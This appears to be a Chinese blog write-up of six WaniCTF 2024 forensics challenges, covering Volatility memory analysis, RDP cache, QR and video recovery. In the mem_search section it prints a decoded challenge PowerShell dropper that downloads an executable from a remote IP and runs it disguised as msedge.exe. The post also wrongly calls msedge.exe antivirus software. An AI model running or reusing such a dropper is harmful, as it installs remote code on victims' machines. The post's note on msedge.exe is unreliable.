@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="还不错，一个人打的取证几乎AK了 Forensics tiny_usb Surveillance_of_sus codebreaker I_wanna_be_a_streamer tiny_10px mem_search Forensics tiny_usb 简单题，AXIOM直接看就行 FLAG{">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WaniCTF 2024 EICS1 Forensics wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="还不错，一个人打的取证几乎AK了 Forensics tiny_usb Surveillance_of_sus codebreaker I_wanna_be_a_streamer tiny_10px mem_search Forensics tiny_usb 简单题，AXIOM直接看就行 FLAG{">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/04.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/10.jpg">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18265870/15.png">
+<meta property="article:published_time" content="2024-06-25T05:37:00.000Z">
+<meta property="article:modified_time" content="2024-06-25T05:37:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Forensics">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18265870/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>WaniCTF 2024 EICS1 Forensics wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-06-19-vsctf-2024-web-spinner-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&text=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&is_video=false&description=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WaniCTF 2024 EICS1 Forensics wp&body=Check out this article: https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&name=WaniCTF 2024 EICS1 Forensics wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&t=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tiny-usb"><span class="toc-number">1.1.</span> <span class="toc-text">tiny_usb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Surveillance-of-sus"><span class="toc-number">1.2.</span> <span class="toc-text">Surveillance_of_sus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#codebreaker"><span class="toc-number">1.3.</span> <span class="toc-text">codebreaker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-wanna-be-a-streamer"><span class="toc-number">1.4.</span> <span class="toc-text">I_wanna_be_a_streamer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tiny-10px"><span class="toc-number">1.5.</span> <span class="toc-text">tiny_10px</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mem-search"><span class="toc-number">1.6.</span> <span class="toc-text">mem_search</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        WaniCTF 2024 EICS1 Forensics wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-25T05:37:00.000Z" class="dt-published" itemprop="datePublished">2024-06-25</time>
+        
+        (Updated: <time datetime="2024-06-25T05:37:00.000Z" class="dt-updated" itemprop="dateModified">2024-06-25</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>还不错，一个人打的取证几乎AK了</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">Forensics</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">tiny_usb</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">Surveillance_of_sus</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">codebreaker</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">I_wanna_be_a_streamer</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">tiny_10px</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.6">mem_search</a></li>
+</ul>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="tiny-usb"><a href="#tiny-usb" class="headerlink" title="tiny_usb"></a>tiny_usb</h2><p>简单题，AXIOM直接看就行</p>
+<p><img src="/images/migrated/18265870/01.png"></p>
+<p><strong>FLAG{hey_i_just_bought_a_usb}</strong></p>
+<h2 id="Surveillance-of-sus"><a href="#Surveillance-of-sus" class="headerlink" title="Surveillance_of_sus"></a>Surveillance_of_sus</h2><p>010Editor打开，注意到为RDP的缓存文件</p>
+<p><img src="/images/migrated/18265870/02.png"></p>
+<p>我们使用工具对.bin文件进行解析，这里使用bmc-tools.py工具: <a target="_blank" rel="noopener" href="https://github.com/ANSSI-FR/bmc-tools">https://github.com/ANSSI-FR/bmc-tools</a></p>
+<p>解析出来一坨.bmp文件，提取与flag相关的文件，发现是个拼图</p>
+<p><img src="/images/migrated/18265870/03.png"></p>
+<p>bmp拼接，肉眼瞪出flag</p>
+<p><img src="/images/migrated/18265870/04.jpg"></p>
+<p>注意这个是yipeee（这个y坑了我好久）</p>
+<p><strong>FLAG{RDP_is_useful_yipeee}</strong></p>
+<h2 id="codebreaker"><a href="#codebreaker" class="headerlink" title="codebreaker"></a>codebreaker</h2><p>题目图片：</p>
+<p><img src="/images/migrated/18265870/05.png"></p>
+<p>最累的一集，直接qrazybox手搓二维码</p>
+<p><img src="/images/migrated/18265870/06.png"></p>
+<p>然后看Reed-Solomon Decoder结束</p>
+<p><img src="/images/migrated/18265870/07.png"></p>
+<p><strong>FLAG{How_scan-dalous}</strong></p>
+<h2 id="I-wanna-be-a-streamer"><a href="#I-wanna-be-a-streamer" class="headerlink" title="I_wanna_be_a_streamer"></a>I_wanna_be_a_streamer</h2><p>Wireshark分析，发现是H-264编码的视频流</p>
+<p><img src="/images/migrated/18265870/08.png"></p>
+<p>先解码RTP包，然后wireshark下插件秒了</p>
+<p><img src="/images/migrated/18265870/09.png"></p>
+<p>最后分解出.264格式的视频，直接下载MilkPlayer播放</p>
+<p><img src="/images/migrated/18265870/10.jpg"></p>
+<p><strong>FLAG{Th4nk_y0u_f0r_W4tching}</strong></p>
+<p>好题，尤其是最后的FLAG很有感觉</p>
+<h2 id="tiny-10px"><a href="#tiny-10px" class="headerlink" title="tiny_10px"></a>tiny_10px</h2><p><img src="/images/migrated/18265870/11.png"></p>
+<p>根据如上原理更改图片大小即可（学到了）</p>
+<p>下载图片拖到cybershef里</p>
+<p><img src="/images/migrated/18265870/12.png"></p>
+<p>慢慢改吧，最后改出来一个合适的值(改成ff c0 00 11 08 00 a0 00 a0)</p>
+<p><img src="/images/migrated/18265870/13.png"></p>
+<p><strong>FLAG{b1g_en0ugh}</strong></p>
+<h2 id="mem-search"><a href="#mem-search" class="headerlink" title="mem_search"></a>mem_search</h2><p>用AXIOM找半天找不着不知道为啥</p>
+<p>没办法了，只能上最硬核的vol3来内存取证了</p>
+<p>老规矩先看info.Info</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f chal_mem_search.DUMP windows.info</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Volatility 3 Framework 2.7.0</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Variable        Value</span><br><span class="line"></span><br><span class="line">Kernel Base     0xf8030e400000</span><br><span class="line">DTB     0x1ad000</span><br><span class="line">Symbols file:///C:/Users/LamentXU/Desktop/WEBCTF/FOR/volatility3-2.7.0/volatility3/symbols/windows/ntkrnlmp.pdb/D9424FC4861E47C10FAD1B35DEC6DCC8-1.json.xz</span><br><span class="line">Is64Bit True</span><br><span class="line">IsPAE   False</span><br><span class="line">layer_name      0 WindowsIntel32e</span><br><span class="line">memory_layer    1 WindowsCrashDump64Layer</span><br><span class="line">base_layer      2 FileLayer</span><br><span class="line">KdDebuggerDataBlock     0xf8030f000b20</span><br><span class="line">NTBuildLab      19041.1.amd64fre.vb_release.1912</span><br><span class="line">CSDVersion      0</span><br><span class="line">KdVersionBlock  0xf8030f00f400</span><br><span class="line">Major/Minor     15.19041</span><br><span class="line">MachineType     34404</span><br><span class="line">KeNumberProcessors      1</span><br><span class="line">SystemTime      2024-05-11 09:33:57</span><br><span class="line">NtSystemRoot    C:\Windows</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  10</span><br><span class="line">NtMinorVersion  0</span><br><span class="line">PE MajorOperatingSystemVersion  10</span><br><span class="line">PE MinorOperatingSystemVersion  0</span><br><span class="line">PE Machine      34404</span><br><span class="line">PE TimeDateStamp        Mon Dec  9 11:07:51 2019</span><br></pre></td></tr></table></figure>
+
+<p>由于题目基本没啥提示，只给了一个unknown file说明是文件相关，那就只能把所有文件都dump出来看看了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f chal_mem_search.DUMP windows.filescan</span><br></pre></td></tr></table></figure>
+
+<p>输出一坨文件，一个一个看能看到有_read_this_as_admin.lnknload_以及_read_this_as_admin.download_</p>
+<p>（其实这里是我先用AXIOM看过了有这两个东西，但是不知道为啥AXIOM分离的时候出了点问题分不出来。像这种大量文件的还是用AXIOM好毕竟人家有分类功能，像这种硬找的还是挺难的）</p>
+<p>分离</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebae1c0</span><br><span class="line">python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebc26c0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18265870/14.png"></p>
+<p>能看到powershell，注意到有base64编码后的内容，对其进行解码</p>
+<p><img src="/images/migrated/18265870/15.png"></p>
+<p>整理得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$u=&#x27;http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ%3D%3D/chall_mem_search.exe&#x27;;</span><br><span class="line">$t=&#x27;WaniTemp&#x27;;</span><br><span class="line">mkdir -force $env:TMP\..\$t;</span><br><span class="line">try&#123;</span><br><span class="line">    iwr $u -OutFile $d\msedge.exe;&amp; $d\msedge.exe;</span><br><span class="line">&#125;catch&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>msedge.exe为windows的杀毒软件，这里这个powershell脚本将恶意软件下载后存到了\msedge.exe里</p>
+<p>可以直接看chall_mem_search.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f chal_mem_search.DUMP windows.dumpfiles --virtaddr 0xcd88cebd4af0</span><br></pre></td></tr></table></figure>
+
+<p>但是有这个必要吗？</p>
+<p>注意到网址中B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ</p>
+<p>直接将RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ用base64解码得FLAG{Dayum_this_is_secret_file}</p>
+<p>补充：比赛结束后看别的大佬wp发现这题还有个假flag</p>
+<p>直接dumpfiles出chall_mem_search.exe拖进IDA里逆向，注意到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int32_t sub_461730()</span><br><span class="line">&#123;</span><br><span class="line">    int32_t __saved_ebp;</span><br><span class="line">    __builtin_memset(&amp;__saved_ebp, 0xcccccccc, 0);</span><br><span class="line">    j_sub_4617b0(&amp;data_46c012);</span><br><span class="line">    MessageBoxW(nullptr, u&quot;B64 decode this!!! RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ&quot;, u&quot;Wani Hackase&quot;, MB_OK);</span><br><span class="line">    j___RTC_CheckEsp();</span><br><span class="line">    j___RTC_CheckEsp();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将RkxBR3tIYWNrZWRfeWlrZXNfc3Bvb2t5fQ用base64解码即为假flag:FLAG{Hacked_yikes_spooky}</p>
+<p><strong>FLAG{Dayum_this_is_secret_file}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tiny-usb"><span class="toc-number">1.1.</span> <span class="toc-text">tiny_usb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Surveillance-of-sus"><span class="toc-number">1.2.</span> <span class="toc-text">Surveillance_of_sus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#codebreaker"><span class="toc-number">1.3.</span> <span class="toc-text">codebreaker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-wanna-be-a-streamer"><span class="toc-number">1.4.</span> <span class="toc-text">I_wanna_be_a_streamer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tiny-10px"><span class="toc-number">1.5.</span> <span class="toc-text">tiny_10px</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mem-search"><span class="toc-number">1.6.</span> <span class="toc-text">mem_search</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&text=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&is_video=false&description=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WaniCTF 2024 EICS1 Forensics wp&body=Check out this article: https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&title=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&name=WaniCTF 2024 EICS1 Forensics wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-06-25-wanictf-2024-eics1-forensics-wp/&t=WaniCTF 2024 EICS1 Forensics wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
